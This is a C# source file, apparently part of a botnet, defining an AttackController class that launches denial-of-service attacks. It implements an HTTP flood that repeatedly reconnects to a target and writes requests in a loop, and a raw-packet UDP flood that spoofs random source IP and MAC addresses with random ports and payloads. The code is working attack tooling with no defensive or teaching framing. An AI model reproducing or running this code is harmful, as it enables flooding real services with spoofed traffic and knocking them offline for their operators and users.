using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;


namespace Botnet
{
    sealed public class AttackController
    {
        private Thread HttpGenerator;
        private Thread UdpGenerator;
        private Random Randomizer = new Random();
        private TcpClient Client;
        private volatile bool Attacking;
        private volatile UInt32 udpCounter;
        private volatile UInt32 httpCounter;
        private int TryConnectAm;
        private void InitClient(ref TcpClient client, NetworkInterface Adapter)
        {
            Client = new TcpClient(new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), 0));
            Client.ReceiveBufferSize = 10000;
            Client.SendBufferSize = 10000;
            //Client.ReceiveTimeout = 500;
        }
        private void processHttpFlood(Object Params)
        {
            AttackParams _params = Params as AttackParams;
            if (_params.HttpFloodEnabled)
            {
                byte[] buff = new byte[1514];
                byte[] msg = System.Text.ASCIIEncoding.ASCII.GetBytes(_params.HttpMsg);
                try
                {
                    while (Attacking)
                    {
                        InitClient(ref Client, Adapter);
                        Client.SendBufferSize = msg.Length;
                        Client.Connect(_params.Target);
                        TryConnectAm = 0;
                        NetworkStream TcpStream = Client.GetStream();
                        try
                        {
                            while (Client.Connected && Attacking)
                            {
                                if (TcpStream.DataAvailable)
                                {
                                    TcpStream.Read(buff, 0, 1514);
                                }
                                if (TcpStream.CanWrite)
                                {
                                    TcpStream.Write(msg, 0, msg.Length);
                                    httpCounter++;
                                }
                                Thread.Sleep(80);
                            }
                        }
                        catch (System.IO.IOException)
                        { }
                    }
                    Client.Close();
                }
                catch (SocketException err)
                {
                    if (err.ErrorCode == (int)SocketError.TimedOut) // 
                    {
                        Thread.Sleep(4000); // wait a bit, let the bitch have some rest
                        if (TryConnectAm == 4)
                        {
                            Attacking = false;
                            ErrorHandler(1, "Unable to connect to goal");
                        }
                        else
                        {
                            TryConnectAm += 1;
                            processHttpFlood(Params);
                        }
                    }
                    if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                    {
                        Attacking = false;
                        ErrorHandler(0, "The specified address is invalid");
                    }
                } 
            }

        }
        private void processUdpFlood(Object Params)
        {
            AttackParams _params = Params as AttackParams;
            if (_params.UdpFloodEnabled)
            {
                NetworkInstruments.IpRandomizer IpSpoofer = new NetworkInstruments.IpRandomizer();
                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac(Adapter, _params.Target.Address);
                ICaptureDevice ActiveDevice = NetworkInstruments.getActiveDevice(Adapter.GetPhysicalAddress());
                ActiveDevice.Open();
                UdpPacket udpPacket = new UdpPacket(0, 80);
                IPv4Packet ipPacket = new IPv4Packet(IPAddress.Any, _params.Target.Address);
                ipPacket.Protocol = IPProtocolType.UDP;
                ipPacket.PayloadPacket = udpPacket;
                if (TargetMac == null)
                {
                    ErrorHandler(1, "Can not get MAC target address");
                    return;
                }; //unable to resolve mac 
                EthernetPacket ethernetPacket = new EthernetPacket(Adapter.GetPhysicalAddress(), TargetMac, EthernetPacketType.None);
                ethernetPacket.PayloadPacket = ipPacket;
                while (Attacking)
                {
                    udpPacket.SourcePort = (ushort)Randomizer.Next(1, 49160);
                    udpPacket.DestinationPort = (ushort)Randomizer.Next(1, 49160);
                    udpPacket.PayloadData = new byte[Randomizer.Next(500)];
                    Randomizer.NextBytes(udpPacket.PayloadData);
                    udpPacket.UpdateCalculatedValues();
                    ipPacket.SourceAddress = IpSpoofer.GetNext(ref Randomizer, _params.RestrictedPool);
                    ipPacket.TimeToLive = Randomizer.Next(20, 128);
                    ipPacket.UpdateCalculatedValues();
                    ipPacket.UpdateIPChecksum();
                    ethernetPacket.SourceHwAddress = NetworkInstruments.GetRandomMac(ref Randomizer);
                    ethernetPacket.UpdateCalculatedValues();
                    udpPacket.UpdateUDPChecksum();
                    ActiveDevice.SendPacket(ethernetPacket);
                    udpCounter++;
                }
            }
        }
        public volatile NetworkInterface Adapter;
        public delegate void ErrorCallBack(int errcode, string message);
        public AttackParams Params;
        public ErrorCallBack ErrorHandler;      //0 - network problem(cant init socket) 1- target is not avaible
        public bool State
        {
            get
            {
                return Attacking;
            }
        }
        public UInt32 HttpCounter
        {
            get
            {
                return httpCounter;
            }
        } //perpahs use counter of sent packets?
        public UInt32 UdpCounter
        {
            get
            {
                return udpCounter;
            }
        }
        public AttackController(AttackParams Params, NetworkInterface Adapter, ErrorCallBack Errorhandler)
        {
            this.Params = Params;
            this.Adapter = Adapter;
            HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
            UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
            this.ErrorHandler = Errorhandler;
            Attacking = false;
        }
        public void start()
        {
            Attacking = true;
            if (HttpGenerator.ThreadState == ThreadState.Stopped)
            {
                HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
            }
            if (HttpGenerator.ThreadState == ThreadState.Unstarted)
            {
                HttpGenerator.IsBackground = true;
                HttpGenerator.Start(Params);
            }
            if (UdpGenerator.ThreadState == ThreadState.Stopped)
            {
                UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
            }
            if (UdpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
            {
                UdpGenerator.IsBackground = true;
                UdpGenerator.Start(Params);
            }
        }
        public void stop()
        {
            Attacking = false;
        }

        public void Close()
        {
            stop();
        }
        public void ResetCounters()
        {
            httpCounter = 0;
            udpCounter = 0;
        }
    }
}
